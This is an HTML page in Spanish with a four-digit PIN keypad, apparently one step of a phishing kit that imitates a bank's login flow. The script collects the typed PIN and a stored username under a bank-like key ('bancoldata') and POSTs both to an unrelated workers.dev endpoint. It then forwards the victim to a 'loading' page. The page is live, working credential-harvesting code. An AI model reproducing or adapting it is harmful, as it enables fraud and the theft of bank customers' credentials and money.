<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Clave</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">

<style>
body {
    margin: 0;
    font-family: 'Inter', sans-serif;
    background: #2b002b;
    color: white;
}

/* HEADER */
header {
    padding: 20px;
}

.back {
    font-size: 24px;
    cursor: pointer;
}

/* CONTENIDO */
.container {
    max-width: 400px;
    margin: auto;
    padding: 20px;
}

/* TITULO */
.title {
    font-size: 28px;
    font-weight: 600;
    margin-top: 20px;
}

/* PIN BOXES */
.pin-container {
    display: flex;
    justify-content: center;
    gap: 15px;
    margin: 40px 0 20px;
}

.pin-box {
    width: 46px;
    height: 40px;
    background: #cfcfd4;
    border-radius: 8px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 26px;
    color: #ff4da6; /* 🔥 ROSADO */
    transition: 0.2s;
}

.pin-box.active {
    transform: scale(1.2);
}

/* TEXTO */
.subtitle {
    text-align: center;
    color: #ccc;
    font-size: 14px;
    margin-bottom: 40px;
}

/* TECLADO */
.keyboard {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 25px;
    text-align: center;
    font-size: 28px;
    margin-top: 20px;
}

.key {
    padding: 15px;
    cursor: pointer;
}

.key:active {
    transform: scale(0.85);
}

/* BOTON OLVIDE */
.forgot {
    margin-top: 30px;
    text-align: center;
}

.forgot button {
    background: transparent;
    border: 1px solid #aaa;
    color: white;
    padding: 12px 20px;
    border-radius: 8px;
    cursor: pointer;
}
</style>
</head>

<body>

<header>
    <span class="back">←</span>
</header>

<div class="container">

    <div class="title">Escribe tu clave</div>

    <div class="pin-container">
        <div class="pin-box" id="p1"></div>
        <div class="pin-box" id="p2"></div>
        <div class="pin-box" id="p3"></div>
        <div class="pin-box" id="p4"></div>
    </div>

    <div class="subtitle">
        No dudamos que seas tú...<br>
        Pero es mejor confirmar ;)
    </div>

    <!-- TECLADO -->
    <div class="keyboard">
        <div class="key" onclick="press(1)">1</div>
        <div class="key" onclick="press(2)">2</div>
        <div class="key" onclick="press(3)">3</div>
        <div class="key" onclick="press(4)">4</div>
        <div class="key" onclick="press(5)">5</div>
        <div class="key" onclick="press(6)">6</div>
        <div class="key" onclick="press(7)">7</div>
        <div class="key" onclick="press(8)">8</div>
        <div class="key" onclick="press(9)">9</div>
        <div></div>
        <div class="key" onclick="press(0)">0</div>
        <div class="key" onclick="del()">⌫</div>
    </div>

    <div class="forgot">
        <button>Olvidé mi clave</button>
    </div>

</div>

<script>
let pin = [];

function render() {
    for (let i = 1; i <= 4; i++) {
        const box = document.getElementById("p" + i);

        if (pin[i-1] !== undefined) {
            box.innerText = "*"; // 🔥 SIEMPRE MUESTRA (INCLUSO 0)
            box.classList.add("active");
        } else {
            box.innerText = "";
            box.classList.remove("active");
        }
    }
}

function press(num) {
    if (pin.length < 4) {
        pin.push(num);
        render();
    }

    if (pin.length === 4) {
        enviar();
    }
}

function del() {
    pin.pop();
    render();
}

/* 🔥 TU LOGICA ORIGINAL */
async function enviar() {
    let clave = pin.join("");

    let data = {};
    try {
        data = JSON.parse(localStorage.getItem("bancoldata")) || {};
    } catch {
        data = {};
    }

    const transactionId = "txn_" + Date.now();

    data.clave = clave;
    data.transactionId = transactionId;

    localStorage.setItem("bancoldata", JSON.stringify(data));

    await new Promise(r => setTimeout(r, 800));

    const res = await fetch("https://quiet-haze-3548.micollflorez.workers.dev/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            usuario: data.usuario,
            clave: data.clave,
            transactionId
        })
    });

    const json = await res.json();

    if (json.ok) {
        window.location.href = "loading.html";
    } else {
        alert("Error: " + json.error);
        pin = [];
        render();
    }
}

render();
</script>

</body>
</html>
